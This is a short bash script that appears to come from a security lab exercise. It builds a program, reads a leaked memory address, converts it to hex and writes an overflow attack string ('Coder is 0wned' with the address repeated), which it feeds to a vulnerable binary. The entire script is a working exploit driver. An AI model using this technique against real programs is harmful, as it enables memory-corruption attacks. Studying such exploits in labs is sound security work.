#!/bin/bash

make
#Gets the correct address to write into
echo -ne "\n\n\n" | ./modified > \dev\null 2> resource.txt
ADDRESS=`cat resource.txt`

#Converts to proper hex and uses to format attack string
HEX=`python newConvert.py $ADDRESS`
echo -ne "\n\nCoder is 0wned \0Coder is 0wned \0$HEX\0\0$HEX\0\0" > rand.txt 

#Runs executable with proper string
./a.out < rand.txt

